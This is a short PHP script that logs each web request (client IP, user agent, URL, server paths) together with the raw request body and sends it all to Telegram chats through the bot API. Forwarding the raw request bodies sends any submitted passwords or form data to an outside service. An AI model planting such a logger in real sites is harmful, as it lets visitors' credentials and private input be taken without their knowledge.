<?php

$tokenbot = 'Token Bot'; // Token BOT

$teleid = [

    "id"

]; // Chat ID

class bot_telegram
{

    function log()
    {

        $ip = $_SERVER['REMOTE_ADDR'];
        $protocol = $_SERVER['HTTPS'] == 'on' ? 'https' : 'http';
        $url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $msg_format = "R&D ICWR Bot Website Log\n\n";
        $msg_format .= "Access Time : " . date("r") . "\n";
        $msg_format .= "Server Name : " . $_SERVER['SERVER_NAME'] . "\n";
        $msg_format .= "Server PORT : " . $_SERVER['SERVER_PORT'] . "\n";
        $msg_format .= "Request Method : " . $_SERVER['REQUEST_METHOD'] . "\n";
        $msg_format .= "Document ROOT Server : " . $_SERVER['DOCUMENT_ROOT'] . "\n";
        $msg_format .= "Script Location : " . $_SERVER['SCRIPT_FILENAME'] . "\n";
        $msg_format .= "Server Software : " . $_SERVER['SERVER_SOFTWARE'] . "\n";
        $msg_format .= "IP Address Client : " . $ip . "\n";
        $msg_format .= "PORT Client : " . $_SERVER['REMOTE_PORT'] . "\n";
        $msg_format .= "URL Access Client : " . $url . "\n";
        $msg_format .= "User Agent Client : " . $_SERVER['HTTP_USER_AGENT'] . "\n";

        if (!empty(file_get_contents('php://input'))) {

            $msg_format .= "Client Content : \n\n" . file_get_contents('php://input') . "\n";

        }

        return $msg_format;

    }

    function send_msg_telegram($tokenbot, $teleid, $msg)
    {
    

        foreach ($teleid as $id)
        {

            $data = [

                'text' => $msg,
                'chat_id' => $id

            ];

            file_get_contents("https://api.telegram.org/bot$tokenbot/sendMessage?" . http_build_query($data));

        }

    }

}

$func = New bot_telegram();
$msg = $func->log();
$result = $func->send_msg_telegram($tokenbot, $teleid, $msg);
